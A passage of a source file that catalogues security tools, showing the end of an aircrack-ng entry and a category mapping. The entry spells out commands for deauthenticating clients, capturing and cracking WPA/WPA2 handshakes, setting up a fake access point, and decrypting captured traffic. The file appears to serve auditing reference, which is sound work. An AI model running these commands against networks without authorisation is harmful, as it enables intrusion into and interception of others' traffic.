      "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon  # Target specific AP",
      "aircrack-ng -w wordlist.txt capture-01.cap  # Crack WPA/WPA2"
    ],
    advanced_usage: [
      "aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon  # Deauth attack",
      "aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture*.cap",
      "airbase-ng -e FreeWiFi -c 6 wlan0mon  # Create fake AP",
      "airdecap-ng -e SSID -p password capture.cap  # Decrypt captured traffic"
    ],
    examples: [
      {
        command: "airmon-ng start wlan0\nairodump-ng -c 11 --bssid 00:11:22:33:44:55 -w capture wlan0mon",
        description: "Monitor specific WiFi channel and capture handshakes"
      },
      {
        command: "aircrack-ng -w rockyou.txt capture-01.cap",
        description: "Crack WPA/WPA2 password with wordlist"
      }
    ],
    use_cases: [
      "Wireless network security auditing",
      "WPA/WPA2 password strength testing",
      "WiFi penetration testing",
      "Rogue access point detection",
      "Wireless troubleshooting"
    ],
    documentation: "https://www.aircrack-ng.org/documentation.html",
    notes: [
      "⚠️ Requires wireless adapter with monitor mode support",
      "Deauth attacks may be illegal in some jurisdictions",
      "WPA3 not yet fully supported",
      "GPU acceleration available with aircrack-ng + hashcat"
    ]
  }
};

// Tool categories mapping
export const TOOL_CATEGORIES = {
  network_scanning: ["nmap", "masscan", "shodan"],
  web_security: ["owasp-zap", "nuclei", "sqlmap"],
  vulnerability_assessment: ["openvas", "trivy", "nuclei", "shodan"],
  pentesting: ["metasploit", "sqlmap", "hydra"],
  osint: ["theharvester", "shodan"],
  password_testing: ["hydra", "hashcat", "aircrack-ng"],
  forensics: ["autopsy", "volatility", "wireshark"],
  network_monitoring: ["snort", "wireshark"],
  ids: ["snort"],
  wireless: ["aircrack-ng"],
  container_security: ["trivy"],
  exploitation: ["metasploit"],
  malware_analysis: ["volatility"]
};
